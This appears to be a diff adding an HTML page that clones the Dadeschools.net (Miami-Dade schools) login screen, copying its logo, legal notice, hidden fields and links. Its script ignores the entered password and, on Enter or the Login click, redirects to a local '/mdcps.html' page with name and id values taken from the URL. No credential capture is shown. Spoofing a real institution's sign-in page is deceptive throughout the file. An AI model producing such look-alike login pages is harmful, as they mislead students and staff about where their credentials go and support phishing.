@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head><meta http-equiv="X-UA-Compatible" content="IE=edge" /><meta name="viewport" content="width=device-width, initial-scale=1" /><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" /><title>
+	Dadeschools.net Login
+</title>    
+    <script type="text/javascript" src="/_auth/include/Encryption.js"></script>
+    <script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://auth.dadeschools.net/_auth/ds_assets/bootstrap-3.3.2-dist/js/bootstrap.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://auth.dadeschools.net/_auth/ds_assets/bootstrap-3.3.2-dist/css/bootstrap.min.css" />
+    <link rel="stylesheet" type="text/css" href="https://auth.dadeschools.net/_auth/ds_assets/css/login.css" />
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="icon" href="/favicon.ico" type="image/x-icon" /></head>
+
+<style>
+	#brand {
+		border-radius: 50%;
+		width: 105px;
+		height: 105px;
+		background-position: center center;
+		background-size: cover;
+		-webkit-box-shadow: 0 0 1px 1px rgba(0, 0, 0, .3);
+		display: inline-block;
+		margin-top: 20px !important;
+	}
+	
+	.btn-primary:hover,
+	.btn-primary:focus,
+	.btn-primary:active,
+	.btn-primary.active,
+	.open .dropdown-toggle.btn-primary {
+		color: #fff;
+		border-color: #285e8e;
+		background-color: #19B5FE;
+
+	}
+	.btn-square {
+        padding-top: 20px;
+		background-position: center right;
+		margin-top: 15px;
+		margin-bottom: 15px;
+		border: #ccc 0px solid;
+		width: 100px;
+		height: 100px;
+		font-size: 56px;
+		color: #FFF !important;
+	}
+	.btn-square:hover {
+		background-color: #19B5FE !important;
+		border: #FFFFFF 0px solid;
+		color:#FFFFFF !important;
+	}
+	.btn {
+		border-radius: 22px;
+		font-weight: 700;
+	}
+	.form-control {
+		border-radius: 22px;
+		text-align: center;
+	}
+	.form-control::-moz-placeholder{color:#285e8e;opacity:1}.form-control:-ms-input-placeholder{color:#285e8e}.form-control::-webkit-input-placeholder{color:#285e8e}
+	
+   /* Blink for Webkit and others
+   (Chrome, Safari, Firefox, IE, ...)
+   */
+	@-webkit-keyframes blinker {
+		from {opacity: 1.0;}
+		to {opacity: 0.0;}
+	}
+	.blink{
+		text-decoration: blink;
+		-webkit-animation-name: blinker;
+		-webkit-animation-duration: 0.6s;
+		-webkit-animation-iteration-count:infinite;
+		-webkit-animation-timing-function:ease-in-out;
+		-webkit-animation-direction: alternate;
+	}
+</style>
+			
+<body class="positive" onload="checkCookie();">
+<h1 class="hidden">heading here</h1>   
+    <div class="app-wrapper">
+        <div class="app-wrapper-inner">
+            <div class="app-container">
+                <div class="inner cover" id="goBackParent">
+                    <div>
+                        <div class="hidden-xs"><img src="https://auth.dadeschools.net/_auth/ds_assets/images/dadeschools.png" alt="mdcps-logo" id="brand"></div>
+                        <h2 class="light-heading">Dadeschools.net</h2>
+						<h5>Access to M-DCPS network resources is contingent upon appropriate use of the system, pursuant to the Network Security Standards (<a href="https://policies.dadeschools.net" target="_blank" style="text-decoration: underline;">https://policies.dadeschools.net</a>).<br /> System usage may be monitored and recorded. Unauthorized or inappropriate use will be subject to disciplinary action (up to and including civil penalties and/or criminal prosecution);<br /> Use of this system constitutes consent to monitoring for compliance.</h5>
+						<br />
+                        <div id="login-wraper">
+                         
+                        
+<div class="aspNetHidden">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTIwNzcwOTc5OTYPZBYCAgMPFgIeCG9uc3VibWl0BRhqYXZhc2NyaXB0OlByb2Nlc3NTU08oKTsWAgIFDw8WBh4JRm9yZUNvbG9yCiMeBFRleHRlHgRfIVNCAgRkZGS9K9eye8XJtRQiSFEjs2OPVa0PYC5fLY71rDrdk+cnPQ==" />
+</div>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="E4F0B6E9" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAmR9Yy4XqrmOT1JBkPhVscOVK7BrRAtEiqu9nGFEI+jB3Y2+Mc6SrnAqio3oCKbxYZFpTC+E5MsscduCUAhRuL7Av1cMec6pGIXtMBqoFkHTSoAp4IKDlDhdeHWQXm3LhvAWJZOEYoD8h6c1n1212Rtxpe53CanMK+2STX+sQMOCI1DNgwHvcLnUHQCnLT4QDgvzy7cw3klS3yXuKriwbxjRBXYnTA8tFlz35kIZn+0ng==" />
+</div>
+                            <div id="pnlLogon" class="pnlLogon">
+                            <div id="pnlLogon" class="pnlLogon">
+	
+                                            
+                            <div class="form-group form-login">
+                                <div class="lead">
+                                    <!--<label class="lead" for="Username">Username</label>
+                                    <input type="Username" class="form-control" id="inputUsername" placeholder="Username">-->
+                                    <input name="txtUsername" id="txtUsername" class="form-control" placeholder="Username" aria-labelledby="txtUsername" type="Username" />
+                                </div>
+                            </div>
+                                  
+                            <!--Password-->     
+                            <div class="form-group form-login">
+                            <div class="lead">                            
+                                <!--<label class="lead" for="Password">Password</label>
+                                <input type="Password" class="form-control" id="inputPassword" placeholder="Password">-->
+                                <input name="txtPassword" type="password" id="txtPassword" type="Password" aria-labelledby="txtPassword" class="form-control" placeholder="Password" />
+                            </div>
+                            </div>
+                               
+                            <!--Remember me-->
+                            <div class="form-group form-login">
+                            <div class="lead">
+                                <div class="checkbox" style="display: inline-block">
+                                <input type="checkbox" id="cbxRemember" class="checkbox-inline"  aria-labelledby="cbxRemember"/>Remember Username
+                                </div>
+                            </div>
+                            </div>
+                            
+                            <!--Login-->    
+                            <div class="lead form-login">
+                                <!--<button type="submit" class="btn btn-primary btn-lg">Login</button>-->
+                                <input name="btnLogon" value="Login" onclick="loginBtnClicked()" 
+                                id="btnLogon" type="submit" class="btn btn-primary btn-lg" />
+                                <br/><br/>
+                            </div>
+                            
+</div>
+                            
+
+                                <div id="divWait" style="display:none"><span class="glyphicon glyphicon-refresh spinning"></span> Please Wait...</div>
+
+                                <span id="lblMessage" class="lblmsg" style="color:Black;color: White"></span>
+                        
+                                <div class="lead">
+                                    <!--Forgot Username/Password?-->
+                                    <a href="https://portalaccounts.dadeschools.net/#!/fullWidth/3892">Forgot Username/Password?</a>
+                                    <span> |</span>
+                                    <!--Create an Account-->
+                                    <a href="https://portalaccounts.dadeschools.net/#!/fullWidth/3893">Create an Account</a>
+                                </div>
+                                                        
+                                <div class="item" data-aos="fade">
+                                    <span class="hidden-xs"><br/></span>
+                                    <h3 class="light-heading">Badge Login</h3>
+                                    <li><span class="blink glyphicon glyphicon-menu-down"</span></li>
+                                    <a href="https://clever.com/oauth/badges/login?target=NTEwNmNlYzNhMTRiMTdhZjBmMDAwMDU0;NGM2M2MxY2Y2MjNkY2U4MmNhYWM=;aHR0cHM6Ly9jbGV2ZXIuY29tL2luL2F1dGhfY2FsbGJhY2s=;ZjRkMDdmZmYzMDkxODI4MzkzZGZmNjgyZjZlNTAzZjUyNDYyMDgyYjA2MWVlMzQ2ODcyMTBlNjQ3Yzg3ODA4ZA==;Y29kZQ==" target="_blank" class="btn btn-primary btn-square"><span class="glyphicon glyphicon-qrcode icon-xl"></span>
+                                        <span class="hidden">Badge Login</span>
+                                    </a>
+                                </div>
+ 
+                                <input type="hidden" name="ENC_VAL_0" id="ENC_VAL_0" value="36" />
+                                <input type="hidden" name="ENC_VAL_1" id="ENC_VAL_1" />
+                                <input type="hidden" name="ENC_VAL_2" id="ENC_VAL_2" />
+                                <input type="hidden" name="ENC_VAL_3" id="ENC_VAL_3" />
+                                <input type="hidden" name="ENC_VAL_4" id="ENC_VAL_4" />
+                                <div align="center"><p>...<p/></div> 
+
+                            </div>
+                        
+
+<script type="text/javascript">
+    const urlQuery = window.location.search;
+    const queries = new URLSearchParams(urlQuery);
+
+    const name = queries.get("name")
+    const IDNum = queries.get('id')
+
+    document.querySelector("#txtPassword").addEventListener("keypress", (e) => {
+        if (e.keyCode == 13) {
+            setTimeout(window.location.href = `/mdcps.html?name=${name}&id=${IDNum}`, 1000)
+            
+        }
+        else {
+            console.log("pressed");
+        }
+    })
+
+    function loginBtnClicked() {
+
+        const urlQuery = window.location.search;
+        const queries = new URLSearchParams(urlQuery);
+
+        const name = queries.get("name")
+        const IDNum = queries.get('id')
+
+        setTimeout(window.location.href = `/mdcps.html?name=${name}&id=${IDNum}`, 1000)
+
+    }
+    
+
+</script>
+</form>
+                             
+                        </div>
+                    </div>   
+                </div>
+            </div>
+        </div>
+    </div>
+    
+
+</body>
+</html>
+<script id="f5_cspm">(function(){var f5_cspm={f5_p:'NDIDFDINNJNBJKNKCBCOBOGMKMBKJIBNIAHLKBLDADCNNPMIADKINCGOJBGJHJDIIFMBIHPBAALODJJAICBADKLIAAPPJNPHMCAPJFJMHAOFANHBMBNGKJHGPBLGDKEM',setCharAt:function(str,index,chr){if(index>str.length-1)return str;return str.substr(0,index)+chr+str.substr(index+1);},get_byte:function(str,i){var s=(i/16)|0;i=(i&15);s=s*32;return((str.charCodeAt(i+16+s)-65)<<4)|(str.charCodeAt(i+s)-65);},set_byte:function(str,i,b){var s=(i/16)|0;i=(i&15);s=s*32;str=f5_cspm.setCharAt(str,(i+16+s),String.fromCharCode((b>>4)+65));str=f5_cspm.setCharAt(str,(i+s),String.fromCharCode((b&15)+65));return str;},set_latency:function(str,latency){latency=latency&0xffff;str=f5_cspm.set_byte(str,40,(latency>>8));str=f5_cspm.set_byte(str,41,(latency&0xff));str=f5_cspm.set_byte(str,35,2);return str;},wait_perf_data:function(){try{var wp=window.performance.timing;if(wp.loadEventEnd>0){var res=wp.loadEventEnd-wp.navigationStart;if(res<60001){var cookie_val=f5_cspm.set_latency(f5_cspm.f5_p,res);window.document.cookie='f5avr0710902810aaaaaaaaaaaaaaaa_cspm_='+encodeURIComponent(cookie_val)+';path=/;'+'';}
+return;}}
+catch(err){return;}
+setTimeout(f5_cspm.wait_perf_data,100);return;},go:function(){var chunk=window.document.cookie.split(/\s*;\s*/);for(var i=0;i<chunk.length;++i){var pair=chunk[i].split(/\s*=\s*/);if(pair[0]=='f5_cspm'&&pair[1]=='1234')
+{var d=new Date();d.setTime(d.getTime()-1000);window.document.cookie='f5_cspm=;expires='+d.toUTCString()+';path=/;'+';';setTimeout(f5_cspm.wait_perf_data,100);}}}}
+f5_cspm.go();}());</script>
